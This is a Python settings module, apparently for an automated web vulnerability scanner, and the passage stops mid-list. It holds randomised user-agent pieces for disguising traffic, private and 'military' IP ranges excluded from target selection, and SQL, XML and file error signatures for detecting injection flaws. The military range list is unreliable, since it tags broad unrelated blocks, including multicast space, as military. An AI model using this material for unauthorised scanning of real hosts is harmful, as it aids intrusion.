import ipaddress
import random

# Define private IP address ranges

class Common_Variables:
    user_agents_list=[]
    USER_AGENT_PARTS = {
        'browser_header':
            ['Mozilla/5.0', 'Mozilla/4.0', 'Opera/9.52', 'SonyEricssonJ300c/R2BA', 'Opera/9.50', 'Mozilla/4.05', 'Opera/9.80', 'Opera/9.22', 'ELinks/0.11.4rc1', 'Opera/7.0', 'Opera/9.64', 'NokiaN95/GoBrowser', 'Opera/9.25', 'NokiaN86_8MP/GoBrowser/1.6.0.4868.208.92;', 'Opera/9.01', 'Opera/9.70', 'NokiaN79/GoBrowser', 'Opera/9.62', 'Mozilla/6.0', 'Opera/7.11', 'Mozilla/4.77', 'Opera/9.51', 'Opera/9.21', 'ELinks/0.11.7', 'Mozilla/4.7', 'Mozilla/4.75', 'Opera/9.63', 'Lynx/2.8.4rel.1', 'ELinks/0.11.1-1.5ubuntu1-debian', 'Opera/9.02', 'Opera/6.03', 'Mozilla/4.78', 'Mozilla/4.8', 'Links', 'Mozilla/4.72', '(Windows', 'Mozilla/5.001', 'Lynx/2.8.5dev.16', 'Mozilla/4.08', 'Opera/9.99', 'ELinks/0.12~pre5-8', 'Opera/6.04', 'Opera/5.02', 'Midori/0.1.6', 'Opera/7.03', 'Nokia5230/GoBrowser/1.6.0.70', 'Opera/8.50', 'Opera/8.51', 'Opera/9.20', 'Doris/1.15', 'Opera/9.00', 'NokiaN85/GoBrowser', 'Nokia5250/10.0.011', 'ELinks/0.9.3', 'iCab/3.0.2', 'Opera/6.05', 'Opera/8.54', 'Mozilla/4.07', 'iCab/3.0.5', 'Mozilla/4.79', 'Mozilla/4.51', 'Mozilla/5.0(Compatible;', 'ELinks/0.11.6', 'Mozilla/4.76', 'Opera/9.60', 'Mozilla/4.6', 'Mozilla/4.61', 'Lynx/2.8.6dev.11', 'ELinks/0.11.2', 'Opera/9.23', 'Mozilla/4.5', 'Opera/9.27', 'Mozilla/4.73', 'Mozilla/3.0', 'Mozilla/2.0', 'Mozilla/4.8C-SGI', 'Opera/7.23', 'Mozilla/5.0(iPad;', 'ELinks/0.11.1-1.2ubuntu2.2-debian', 'Opera/7.22', 'Mozilla/4.01', 'NokiaE5-00/GoBrowser/1.6.86', 'Uzbl', 'NokiaC6-00/GoBrowser', 'Mozilla/4.71', 'Opera/8.53', 'NCSA', 'Nokia5730XpressMusic/GoBrowser/1.6.0.75', 'SonyEricssonK506c/R2AA', 'Opera/9.30', 'Opera', 'NokiaN81/GoBrowser/1.6.91', 'ELinks', 'Opera/5.12', 'Dooble/0.07', 'Opera/6.0', 'Nokia5630XpressMusic/GoBrowser/1.6.91', 'Mozilla/4.7C-SGI', 'Nokia5700XpressMusic/GoBrowser/1.6.91', 'Opera/9.61', 'ELinks/0.11.4', 'ELinks/0.12~pre2.dfsg0-1ubuntu1', 'Nokia5800XpressMusic/GoBrowser', 'Midori/0.1.1', 'NetSurf/1.2', 'Nokia5800XpressMusic/GoBrowser/1.6.0.75', 'Lynx/2.8.5rel.1', 'Nokia5250/11.0.008', 'LeechCraft', 'Midori/0.2.0', 'Opera/9.26', 'ELinks/0.11.1-1.4-debian', 'Opera/7.21', 'Mozilla/4.74', 'ELinks/0.13.GIT', 'Nokia5320XpressMusic/GoBrowser/2.0.290', 'ELinks/0.11.4-3-lite', 'iCab/4.5', 'Opera/9.10', 'iCab/4.6', 'Opera/7.54', 'Opera/7.53', 'Dillo/0.8.6', 'Dillo/0.8.5', 'Dillo/0.8.3', 'Midori/0.1.5', 'Nokia6120c/GoBrowser', 'NokiaN97_mini/GoBrowser/1.6.0.70', 'Lynx/2.8.7dev.4', 'NokiaX6/GoBrowser', 'Opera/12.0(Windows', 'HTC_HD2_T8585', 'Mozilla/2.02Gold', 'SonyEricssonK300c/R2BA', 'Lynx/2.8.1pre.9', 'Mozilla/3.01Gold', 'Opera/7.52', 'Opera/12.80', 'iCab/4.7', 'Opera/8.52', 'Lynx/2.8.5dev.3', 'Dillo/0.8.5-i18n-misc', 'NetSurf/2.0', 'Opera/9.5', 'Opera/8.0', 'Mozilla/3.02', 'Mozilla/5.0(X11;U;Linux(x86_64);en;rv:1.9a8)Gecko/2007100619;GranParadiso/3.1', 'Mozilla/1.10', 'Nokia5530XpressMusic/GoBrowser/1.6.0.48', 'Opera/4.02', 'Nokia6120c/GoBrowser/1.6.86', 'ELinks/0.10.6', 'Opera/7.20', 'Midori/0.1.8', 'Opera/7.10', 'Nokia6220c/GoBrowser/1.6.86', 'ELinks/0.10.6-1ubuntu3-debian', 'Opera/10.61', 'Opera/6.12', 'ELinks/0.11.3', 'NokiaN85/GoBrowser/1.6.91', 'NokiaN82/GoBrowser/1.6.86', 'Dillo/0.7.3', 'Nokia6124c/GoBrowser/1.6.0.48', 'Chrome/15.0.860.0', 'Midori/0.1.7', 'ELinks/0.11.1-1.2ubuntu2.1-debian', 'Nokia5320XpressMusic/GoBrowser/1.6.0.70', 'Nokia5320XpressMusic/GoBrowser/1.6.91', 'ELinks/0.11.1', 'SonyEricssonK750c/R1BC', 'Mozilla/4.06', 'Opera/8.02', 'Mozilla/4.0(compatible;', 'NCSA_Moperating_systemaic/2.0', 'NokiaC6-00/10.0.021', 'MozillaMozilla/4.0', 'Opera/6.01', 'Mozilla/3.01', 'Lynx/2.8.3rel.1', 'Opera/7.51', 'Mozilla/3.04Gold', 'SonyEricssonS700i/R3B', 'Opera/8.01', 'Lynx/2.8.6rel.4', 'iCab/4.0', 'Opera/8.00', 'NokiaN97/21.1.107', 'Midori/0.1.10', 'Nokia5230/GoBrowser/1.6.0.75', 'ELinks/0.12pre1.GIT', 'Cyberdog/2.0', 'Mozilla/4.76C-SGI', 'AmigaVoyager/3.2', 'Nokia6700s/GoBrowser/1.6.91', 'iCab/2.9.5', 'Mozilla/4.79C-SGI', 'IBM', 'Opera/5.11', 'NokiaN82/GoBrowser/1.6.0.48', 'NokiaN85/GoBrowser/1.6.0.75', 'Opera/9.24', 'Mozilla/45.0', 'iCab/2.9.7', 'Mozilla/4.04', 'SonyEricssonS700c/R3B', 'Lynx/2.8.4dev.7', 'ELinks/0.11.1-1-debian', 'MOT-L7/08.D5.09R', 'IBrowse/2.4', 'ELinks/0.11.1-1.2-debian', 'SAMSUNG-C5212/C5212XDIK1', 'SonyEricssonW800c/R1BC', 'Opera/7.01', 'Mozilla/4.77C-SGI', 'ELinks/0.11.3-8ubuntu3', 'Lynx/2.8.3dev.8', 'Nokia6120c/GoBrowser/1.6.0.70', 'w3m/0.5.2', 'w3m/0.5.1', 'Midori/0.1.9', 'SonyEricssonK530c/R8BA', 'Nokia5320XpressMusic/GoBrowser/1.6.0.75', 'Midori/0.2', 'Opera/10.60', 'uzbl', 'w3m/0.2.1', 'SonyEricssonW700c/R1DB', 'Mozilla/5.0(Windows;', 'Opera/5.0', 'Dillo/0.6.4', 'NokiaN86_8MP/GoBrowser', 'ELinks/0.12pre5', 'NokiaC5-00/GoBrowser/2.0.290', 'ELinks/0.10.3', 'Opera/6.02', 'ELinks/0.12~pre5-1-lite', 'Opera/6.11', 'NetSurf/1.1', 'ELinks/0.10.4-7-debian', 'NokiaN79/GoBrowser/1.6.0.48-cn', 'Surf/0.4.1', 'Opera/9.64(Windows', 'NCSA_Moperating_systemaic/2.6', 'Sundance/0.9x(Compatible;', 'ELinks/0.11.0', 'SonyEricssonK500c/R2L', 'SonyEricssonK750c/R1CA', 'MOT-L7/08.B7.ACR', 'ELinks/0.12.GIT', 'Opera/9.12', 'NokiaN81/GoBrowser/1.6.0.70', 'Opera/9.20(Windows', 'SonyEricssonK750c/R1DB', 'Opera/9.80(J2ME/MIDP;', 'Mozilla/3.04', 'NokiaE72/GoBrowser/1.6.91', 'NokiaE66/GoBrowser/2.0.297', 'iCab/2.9.8', 'Firefox/2.0b1', 'Lynx/2.8.7rel.2', 'Opera/10.50', 'Opera/12.02', 'Mozilla/4.03', 'Mozilla/1.22', 'NokiaN81/GoBrowser', 'NokiaE63/GoBrowser/1.6.86', 'SonyEricssonK700c/R2AE', 'Sundance(Compatible;', 'Lynx/2.8.3dev.6', 'Midori/0.2.2', 'NokiaN79/GoBrowser/1.6.0.48', 'ELinks/0.11.3-5ubuntu2', 'NokiaE52-1/Symbianoperating_system/9.1', 'SonyEricssonW800c/R1AA', 'SonyEricssonW800i/R1BD001/SEMC-Browser/4.2', 'Mozilla/4.41', 'NokiaE5-00/Symbianoperating_system/9.1', 'Midori/0.1.4', 'NokiaN70/GoBrowser', 'SonyEricssonK500c/R2AT', 'Lynx/2.8.5rel.4', 'Lynx/2.8.8dev.3', 'NokiaN97i/Symbianoperating_system/9.1', 'Iron/2.0.168.0', 'Mozilla/2.02', 'Nokia5800XpressMusic/GoBrowser/1.6.0.46', 'iCab/2.9.9', 'retawq/0.2.6c', 'AmigaVoyager/2.95', 'NokiaN97/GoBrowser', 'NCSA_Moperating_systemaic/2.7b4', 'Galaxy/1.0', 'SonyEricssonK530i/R6BA', 'NokiaN95_8GB/GoBrowser', 'SamsungI8910/Symbianoperating_system/9.1', 'NokiaE72/GoBrowser/2.0.290', 'IBrowse/2.3', 'SonyEricssonW800c/R1L', 'Midori/0.1.20', 'NokiaC5-00/GoBrowser/1.6.91', 'HotJava/1.1.2', 'Opera/7.02', 'Nokia5730XpressMusic/GoBrowser', 'Chrome', 'Nokia6700s/GoBrowser/1.6.0.70', 'MOT-L7/NA.ACR_RB', 'Opera/7.50', 'mozilla/3.0', 'MOT-L6i/0A.64.19R', 'HotJava/1.0.1/JRE1.1.x', 'Lynx/2.8.6rel.5', 'Elinks', 'Lynx/2.8.5rel.2', 'Opera/8.10', 'w3m/0.5.1+cvs-1.968', 'w3m/0.1.9', 'SonyEricssonK800c/R8BF', 'MOT-V300/0B.09.19R', 'NokiaN81/GoBrowser/2.0.290', 'ELinks/0.11.4-3', 'NokiaC5-00/GoBrowser', 'Nokia6120c/GoBrowser/1.6.0.48', 'w3m/0.52', 'Dillo/0.8.6-i18n-misc', 'User-Agent:Mozilla/5.0', 'iCab/5.0', 'Nokia5320XpressMusic/GoBrowser/1.6.0.48', 'MOT-L6/0A.60.1BR', 'NokiaN78/GoBrowser/1.6.0.70', 'NokiaN78/GoBrowser/1.6.0.75', 'SonyEricssonK700c/R2CA', 'NokiaC5-00/061.005', 'NokiaN82/GoBrowser', 'ELinks/0.11.4rc0', 'Vimprobable/0.9.20.5', 'NokiaN97_mini/GoBrowser/1.6.0.75', 'ELinks/0.11.1-1.2etch1-debian', 'Lynx/2.8.5rel.5', 'Lynx/2.8.7dev.9', 'NokiaN97_mini/GoBrowser/1.6.0.48', 'Mozilla/15.0', 'Lynx/2.8.5dev.2', 'NokiaN97_mini/GoBrowser', 'Webkit/1.1.8', 'iCab/2.9.1', 'Seamonkey-1.1.13-1(X11;', 'IBrowse/2.4demo', 'Lynx', 'Nokia6120c/GoBrowser/2.0.290', 'HTC_Touch_3G', 'NetSurf/1.0', 'Dillo/2.0', 'NokiaC7-00/Symbianoperating_system/9.1', 'ELinks/0.12pre2', 'SonyEricssonK510c/R4EA', 'Lynx/2.8.7pre.5', 'SonyEricssonW700c/R1CA'],
        'operating_system': {
            'linux': {
                'name': ['Linux x86_64', 'Linux i386'],
                'ext': ['X11']
            },
            'windows': {
                'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
                'ext': ['WOW64', 'Win64; x64']
            },
            'mac': {
                'name': ['Macintoperating_systemh'],
                'ext': list(set(['Intel Mac operating_system X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 1000)]))
            },
        },
        'system_platform': {
            'webkit': {
                'name': list(set(['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 1000)])),
                'details': ['KHTML, like Gecko'],
                'extensions': list(set(['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 1000) ])) + list(set([ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 1000)]))
            },
            'iexplorer': {
                'browser_info': {
                    'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                    'ext_pre': ['compatible', 'Windows; U'],
                    'ext_post': list(set(['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10000)]))
                }
            },
            'gecko': {
                'name': list(set(['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 1000)])),
                'details': [],
                'extensions': []
            }
        }
    }
    # https://edbellmcse.wordpress.com/ip-address-ranges/
    # Define private IP address ranges
    private_ip_ranges = [
        ipaddress.IPv4Network(u"0.0.0.0/8", strict=False),
        ipaddress.IPv4Network(u"10.0.0.0/8", strict=False),
        ipaddress.IPv4Network(u"172.16.0.0/12", strict=False),
        ipaddress.IPv4Network(u"192.168.0.0/16", strict=False),
        ipaddress.IPv4Network(u"127.0.0.0/8", strict=False),
        ipaddress.IPv4Network(u"169.254.0.0/16", strict=False),
        ipaddress.IPv4Network(u"100.64.0.0/10", strict=False)
    ]
    military_ip_ranges = [ipaddress.IPv4Network(x,strict=False) for x in [
                                u"3.0.0.0/8",
                                u"6.0.0.0/8",
                                u"7.0.0.0/8",
                                u"11.0.0.0/8",
                                u"15.0.0.0/8",
                                u"21.0.0.0/8",
                                u"22.0.0.0/8",
                                u"24.198.0.0/16",
                                u"25.0.0.0/8",
                                u"26.0.0.0/8",
                                u"29.0.0.0/8",
                                u"30.0.0.0/8",
                                u"49.0.0.0/8",
                                u"50.0.0.0/8",
                                u"55.0.0.0/8",
                                u"55.0.0.0/8",
                                u"56.0.0.0/8",
                                u"62.0.0.0/11",
                                u"64.70.0.0/16",
                                u"64.224.0.0/11",
                                u"64.225.0.0/11",
                                u"64.226.0.0/11",
                                u"128.37.0.0/16",
                                u"128.38.0.0/16",
                                u"128.43.0.0/16",
                                u"128.47.0.0/16",
                                u"128.49.0.0/16",
                                u"128.50.0.0/16",
                                u"128.51.0.0/16",
                                u"128.56.0.0/16",
                                u"128.60.0.0/16",
                                u"128.63.0.0/16",
                                u"128.80.0.0/16",
                                u"128.98.0.0/16",
                                u"128.102.0.0/16",
                                u"128.149.0.0/16",
                                u"128.154.0.0/16",
                                u"128.155.0.0/16",
                                u"128.156.0.0/16",
                                u"128.157.0.0/16",
                                u"128.158.0.0/16",
                                u"128.159.0.0/16",
                                u"128.160.0.0/16",
                                u"128.161.0.0/16",
                                u"128.183.0.0/16",
                                u"128.190.0.0/16",
                                u"128.202.0.0/16",
                                u"128.216.0.0/16",
                                u"128.217.0.0/16",
                                u"128.236.0.0/16",
                                u"129.23.0.0/16",
                                u"129.29.0.0/16",
                                u"129.50.0.0/16",
                                u"129.51.0.0/16",
                                u"129.52.0.0/13",
                                u"129.54.0.0/16",
                                u"129.92.0.0/16",
                                u"129.99.0.0/16",
                                u"129.131.0.0/16",
                                u"129.139.0.0/16",
                                u"129.141.0.0/16",
                                u"129.163.0.0/16",
                                u"129.164.0.0/16",
                                u"129.165.0.0/16",
                                u"129.166.0.0/16",
                                u"129.167.0.0/16",
                                u"129.168.0.0/16",
                                u"129.190.0.0/16",
                                u"129.198.0.0/16",
                                u"129.209.0.0/16",
                                u"129.229.0.0/16",
                                u"129.251.0.0/16",
                                u"130.40.0.0/16",
                                u"130.90.0.0/16",
                                u"130.109.0.0/16",
                                u"130.114.0.0/16",
                                u"130.124.0.0/16",
                                u"130.165.0.0/16",
                                u"130.167.0.0/16",
                                u"131.3.0.0/16",
                                u"131.6.0.0/16",
                                u"131.10.0.0/16",
                                u"131.17.0.0/16",
                                u"131.21.0.0/16",
                                u"131.22.0.0/16",
                                u"131.24.0.0/16",
                                u"131.25.0.0/16",
                                u"131.27.0.0/16",
                                u"131.30.0.0/16",
                                u"131.32.0.0/16",
                                u"131.35.0.0/16",
                                u"131.36.0.0/16",
                                u"131.37.0.0/16",
                                u"131.38.0.0/16",
                                u"131.39.0.0/16",
                                u"131.40.0.0/16",
                                u"131.44.0.0/16",
                                u"131.46.0.0/16",
                                u"131.47.0.0/16",
                                u"131.50.0.0/16",
                                u"131.52.0.0/16",
                                u"131.54.0.0/16",
                                u"131.56.0.0/16",
                                u"131.58.0.0/16",
                                u"131.59.0.0/16",
                                u"131.61.0.0/16",
                                u"131.62.0.0/16",
                                u"131.71.0.0/13",
                                u"131.74.0.0/16",
                                u"131.84.0.0/16",
                                u"131.92.0.0/16",
                                u"131.105.0.0/16",
                                u"131.110.0.0/16",
                                u"131.120.0.0/16",
                                u"131.121.0.0/16",
                                u"131.122.0.0/16",
                                u"131.176.0.0/16",
                                u"131.182.0.0/16",
                                u"131.250.0.0/16",
                                u"132.3.0.0/16",
                                u"132.5.0.0/16",
                                u"132.6.0.0/16",
                                u"132.7.0.0/16",
                                u"132.8.0.0/16",
                                u"132.9.0.0/16",
                                u"132.10.0.0/16",
                                u"132.11.0.0/16",
                                u"132.12.0.0/16",
                                u"132.13.0.0/16",
                                u"132.14.0.0/16",
                                u"132.15.0.0/16",
                                u"132.16.0.0/16",
                                u"132.17.0.0/16",
                                u"132.18.0.0/16",
                                u"132.19.0.0/16",
                                u"132.20.0.0/16",
                                u"132.21.0.0/16",
                                u"132.22.0.0/16",
                                u"132.24.0.0/16",
                                u"132.25.0.0/16",
                                u"132.27.0.0/16",
                                u"132.28.0.0/16",
                                u"132.30.0.0/16",
                                u"132.31.0.0/16",
                                u"132.33.0.0/16",
                                u"132.34.0.0/16",
                                u"132.35.0.0/16",
                                u"132.37.0.0/16",
                                u"132.38.0.0/16",
                                u"132.39.0.0/16",
                                u"132.40.0.0/16",
                                u"132.42.0.0/16",
                                u"132.43.0.0/16",
                                u"132.45.0.0/16",
                                u"132.46.0.0/16",
                                u"132.48.0.0/16",
                                u"132.49.0.0/16",
                                u"132.50.0.0/16",
                                u"132.52.0.0/16",
                                u"132.54.0.0/16",
                                u"132.55.0.0/16",
                                u"132.56.0.0/16",
                                u"132.57.0.0/16",
                                u"132.58.0.0/16",
                                u"132.59.0.0/16",
                                u"132.60.0.0/16",
                                u"132.61.0.0/16",
                                u"132.62.0.0/16",
                                u"132.79.0.0/16",
                                u"132.80.0.0/16",
                                u"132.82.0.0/16",
                                u"132.86.0.0/16",
                                u"132.87.0.0/16",
                                u"132.94.0.0/16",
                                u"132.95.0.0/16",
                                u"132.95.0.0/16",
                                u"132.104.0.0/16",
                                u"132.105.0.0/16",
                                u"132.109.0.0/16",
                                u"132.110.0.0/16",
                                u"132.114.0.0/16",
                                u"132.117.0.0/16",
                                u"132.118.0.0/16",
                                u"132.122.0.0/16",
                                u"132.133.0.0/16",
                                u"132.134.0.0/16",
                                u"132.159.0.0/16",
                                u"132.193.0.0/16",
                                u"132.250.0.0/16",
                                u"134.5.0.0/16",
                                u"134.11.0.0/16",
                                u"134.12.0.0/16",
                                u"134.51.0.0/16",
                                u"134.52.0.0/16",
                                u"134.78.0.0/16",
                                u"134.80.0.0/16",
                                u"134.118.0.0/16",
                                u"134.131.0.0/16",
                                u"134.136.0.0/16",
                                u"134.164.0.0/16",
                                u"134.165.0.0/16",
                                u"134.194.0.0/16",
                                u"134.205.0.0/16",
                                u"134.207.0.0/16",
                                u"134.229.0.0/16",
                                u"134.230.0.0/16",
                                u"134.232.0.0/16",
                                u"134.233.0.0/16",
                                u"134.234.0.0/16",
                                u"134.235.0.0/16",
                                u"134.240.0.0/16",
                                u"134.241.0.0/16",
                                u"134.242.0.0/16",
                                u"134.243.0.0/16",
                                u"134.244.0.0/16",
                                u"134.245.0.0/16",
                                u"134.246.0.0/16",
                                u"136.149.0.0/16",
                                u"136.178.0.0/16",
                                u"136.188.0.0/16",
                                u"136.207.0.0/16",
                                u"136.208.0.0/16",
                                u"136.209.0.0/16",
                                u"136.210.0.0/16",
                                u"136.212.0.0/16",
                                u"136.213.0.0/16",
                                u"136.214.0.0/16",
                                u"136.215.0.0/16",
                                u"136.216.0.0/16",
                                u"136.217.0.0/16",
                                u"136.218.0.0/16",
                                u"136.219.0.0/16",
                                u"136.220.0.0/16",
                                u"136.221.0.0/16",
                                u"136.222.0.0/16",
                                u"137.1.0.0/16",
                                u"137.2.0.0/16",
                                u"137.3.0.0/16",
                                u"137.4.0.0/16",
                                u"137.5.0.0/16",
                                u"137.6.0.0/16",
                                u"137.11.0.0/16",
                                u"137.12.0.0/16",
                                u"137.17.0.0/16",
                                u"137.24.0.0/16",
                                u"137.29.0.0/16",
                                u"137.67.0.0/16",
                                u"137.94.0.0/16",
                                u"137.95.0.0/16",
                                u"137.126.0.0/16",
                                u"137.127.0.0/16",
                                u"137.128.0.0/16",
                                u"137.130.0.0/16",
                                u"137.209.0.0/16",
                                u"137.210.0.0/16",
                                u"137.211.0.0/16",
                                u"137.212.0.0/16",
                                u"137.231.0.0/16",
                                u"137.232.0.0/16",
                                u"137.233.0.0/16",
                                u"137.234.0.0/16",
                                u"137.235.0.0/16",
                                u"137.240.0.0/16",
                                u"137.241.0.0/16",
                                u"137.242.0.0/16",
                                u"137.243.0.0/16",
                                u"137.244.0.0/16",
                                u"137.245.0.0/16",
                                u"137.246.0.0/16",
                                u"138.13.0.0/16",
                                u"138.27.0.0/16",
                                u"138.50.0.0/16",
                                u"138.65.0.0/16",
                                u"138.76.0.0/16",
                                u"138.109.0.0/16",
                                u"138.115.0.0/16",
                                u"138.135.0.0/16",
                                u"138.136.0.0/16",
                                u"138.137.0.0/16",
                                u"138.139.0.0/16",
                                u"138.140.0.0/16",
                                u"138.141.0.0/16",
                                u"138.142.0.0/16",
                                u"138.143.0.0/16",
                                u"138.144.0.0/16",
                                u"138.145.0.0/16",
                                u"138.146.0.0/16",
                                u"138.147.0.0/16",
                                u"138.148.0.0/16",
                                u"138.149.0.0/16",
                                u"138.150.0.0/16",
                                u"138.151.0.0/16",
                                u"138.152.0.0/16",
                                u"138.153.0.0/16",
                                u"138.154.0.0/16",
                                u"138.155.0.0/16",
                                u"138.156.0.0/16",
                                u"138.157.0.0/16",
                                u"138.158.0.0/16",
                                u"138.159.0.0/16",
                                u"138.160.0.0/16",
                                u"138.161.0.0/16",
                                u"138.162.0.0/16",
                                u"138.163.0.0/16",
                                u"138.164.0.0/16",
                                u"138.165.0.0/16",
                                u"138.166.0.0/16",
                                u"138.167.0.0/16",
                                u"138.168.0.0/16",
                                u"138.169.0.0/16",
                                u"138.169.12.0/20",
                                u"138.169.13.0/20",
                                u"138.170.0.0/16",
                                u"138.171.0.0/16",
                                u"138.172.0.0/16",
                                u"138.173.0.0/16",
                                u"138.174.0.0/16",
                                u"138.175.0.0/16",
                                u"138.176.0.0/16",
                                u"138.177.0.0/16",
                                u"138.178.0.0/16",
                                u"138.179.0.0/16",
                                u"138.180.0.0/16",
                                u"138.181.0.0/16",
                                u"138.182.0.0/16",
                                u"138.183.0.0/16",
                                u"138.184.0.0/16",
                                u"138.193.0.0/16",
                                u"139.31.0.0/16",
                                u"139.32.0.0/16",
                                u"139.33.0.0/16",
                                u"139.34.0.0/16",
                                u"139.35.0.0/16",
                                u"139.36.0.0/16",
                                u"139.37.0.0/16",
                                u"139.38.0.0/16",
                                u"139.39.0.0/16",
                                u"139.40.0.0/16",
                                u"139.41.0.0/16",
                                u"139.42.0.0/16",
                                u"139.43.0.0/16",
                                u"139.124.0.0/16",
                                u"139.142.0.0/16",
                                u"140.1.0.0/16",
                                u"140.3.0.0/16",
                                u"140.4.0.0/16",
                                u"140.5.0.0/16",
                                u"140.6.0.0/16",
                                u"140.7.0.0/16",
                                u"140.8.0.0/16",
                                u"140.9.0.0/16",
                                u"140.10.0.0/16",
                                u"140.11.0.0/16",
                                u"140.12.0.0/16",
                                u"140.13.0.0/16",
                                u"140.14.0.0/16",
                                u"140.15.0.0/16",
                                u"140.16.0.0/16",
                                u"140.17.0.0/16",
                                u"140.18.0.0/16",
                                u"140.19.0.0/16",
                                u"140.20.0.0/16",
                                u"140.21.0.0/16",
                                u"140.22.0.0/16",
                                u"140.23.0.0/16",
                                u"140.24.0.0/16",
                                u"140.25.0.0/16",
                                u"140.26.0.0/16",
                                u"140.27.0.0/16",
                                u"140.28.0.0/16",
                                u"140.29.0.0/16",
                                u"140.30.0.0/16",
                                u"140.31.0.0/16",
                                u"140.32.0.0/16",
                                u"140.33.0.0/16",
                                u"140.34.0.0/16",
                                u"140.35.0.0/16",
                                u"140.36.0.0/16",
                                u"140.37.0.0/16",
                                u"140.38.0.0/16",
                                u"140.39.0.0/16",
                                u"140.40.0.0/16",
                                u"140.41.0.0/16",
                                u"140.42.0.0/16",
                                u"140.43.0.0/16",
                                u"140.44.0.0/16",
                                u"140.45.0.0/16",
                                u"140.46.0.0/16",
                                u"140.47.0.0/16",
                                u"140.47.0.0/16",
                                u"140.48.0.0/16",
                                u"140.48.0.0/16",
                                u"140.49.0.0/16",
                                u"140.50.0.0/16",
                                u"140.51.0.0/16",
                                u"140.52.0.0/16",
                                u"140.53.0.0/16",
                                u"140.54.0.0/16",
                                u"140.55.0.0/16",
                                u"140.56.0.0/16",
                                u"140.57.0.0/16",
                                u"140.58.0.0/16",
                                u"140.59.0.0/16",
                                u"140.60.0.0/16",
                                u"140.61.0.0/16",
                                u"140.62.0.0/16",
                                u"140.63.0.0/16",
                                u"140.64.0.0/16",
                                u"140.65.0.0/16",
                                u"140.66.0.0/16",
                                u"140.67.0.0/16",
                                u"140.68.0.0/16",
                                u"140.69.0.0/16",
                                u"140.70.0.0/16",
                                u"140.71.0.0/16",
                                u"140.72.0.0/16",
                                u"140.73.0.0/16",
                                u"140.74.0.0/16",
                                u"140.100.0.0/16",
                                u"140.139.0.0/16",
                                u"140.154.0.0/16",
                                u"140.155.0.0/16",
                                u"140.156.0.0/16",
                                u"140.175.0.0/16",
                                u"140.178.0.0/16",
                                u"140.187.0.0/16",
                                u"140.194.0.0/16",
                                u"140.195.0.0/16",
                                u"140.199.0.0/16",
                                u"140.201.0.0/16",
                                u"140.202.0.0/16",
                                u"143.0.0.0/8",
                                u"144.0.0.0/8",
                                u"146.0.0.0/8",
                                u"147.0.0.0/8",
                                u"148.0.0.0/8",
                                u"150.0.0.0/8",
                                u"152.0.0.0/8",
                                u"153.0.0.0/8",
                                u"155.0.0.0/8",
                                u"156.0.0.0/8",
                                u"157.0.0.0/8",
                                u"158.0.0.0/8",
                                u"159.0.0.0/8",
                                u"160.0.0.0/8",
                                u"161.0.0.0/8",
                                u"162.0.0.0/8",
                                u"163.0.0.0/8",
                                u"164.0.0.0/8",
                                u"167.0.0.0/8",
                                u"168.0.0.0/8",
                                u"169.0.0.0/16",
                                u"194.0.0.0/8",
                                u"195.10.0.0/16",
                                u"198.18.0.0/15",
                                u"199.121.4.0/22",
                                u"203.59.0.0/16",
                                u"204.34.0.0/16",
                                u"205.0.0.0/8",
                                u"207.30.0.0/16",
                                u"207.60.0.0/16",
                                u"208.240.0.0/12",
                                u"209.35.0.0/16",
                                u"212.56.107.22",
                                u"212.159.0.2",
                                u"212.159.1.1",
                                u"212.159.1.4",
                                u"212.159.1.5",
                                u"212.159.33.56",
                                u"212.159.40.211",
                                u"212.159.41.173",
                                u"212.208.0.0/12",
                                u"213.8.0.0/16",
                                u"216.25.0.0/16",
                                u"216.94.0.0/16",
                                u"216.247.0.0/16",
                                u"216.248.0.0/16",
                                u"224.0.0.0/8",

    ]]
    excluded_ip_ranges=military_ip_ranges+private_ip_ranges
    sql_errors=['Warning: mysql_query()','sqlite3.OperationalError','error in your SQL syntax','mysql_fetch', 'num_rows', 'ORA-01756', 'Error Executing Database Query', 'SQLServer JDBC Driver',
    'Microsoft OLE DB Provider for SQL Server', 'Unclosed quotation mark', 'ODBC Microsoft Access Driver', 'Microsoft JET Database', 'Error Occurred While Processing Request',
    'Server Error', 'Microsoft OLE DB Provider for ODBC Drivers error', 'Invalid Querystring', 'OLE DB Provider for ODBC', 'VBScript Runtime', 'ADODB.Field',
    'BOF or EOF', 'ADODB.Command', 'JET Database', 'mysql_fetch_array()', 'Syntax error', 'mysql_numrows()', 'GetArray()', 'FetchRow()', 'Input string was not in a correct format',
    'quoted string not properly terminated','unclosed quotation mark after the character string','you have an error in your']

    xml_parser_errors=[
        'org.xml.sax.SAXParseException',
        "Error parsing XML:",
        "Invalid XML format:",
        "End tag mismatch:",
        "XML Parsing Error:",
        "Undefined entity reference:",
        "xml.etree.ElementTree.",
        'javax.xml.parsers.',
        'SyntaxError: mismatched tag:',
        'ExpatError: not well-formed (invalid token):',
        'xml.parsers.expat.',
        'Warning: simplexml_load_string():',
        'Warning: DOMDocument::loadXML():',
        'REXML::ParseException:',
        'Uncaught SyntaxError: Unexpected token < in JSON at position',
        "DOMException: Failed to execute 'createElement' on 'Document':",
        "TypeError: Failed to execute 'appendChild' on 'Node': parameter"
    ]

    open_file_errors=[
        "FileNotFoundError: [Errno 2] No such file or directory",
        "PermissionError: [Errno 13] Permission denied",
        "IOError: [Errno 2] No such file or directory",
        "OSError: [Errno 5] Input/output error",
        "failed to open stream: No such file or directory",
        "failed to open stream: Permission denied",
        "failed to open stream: Resource temporarily unavailable",
        "No such file or directory",
        "Permission denied at ",
        "No such file or directory at",
        "IOError: Unable to open",
        "Errno::ENOENT: No such file or directory",
        "Errno::EACCES: Permission denied",
        "Errno::EISDIR: Is a directory",
        "IOError: No such file or directory",
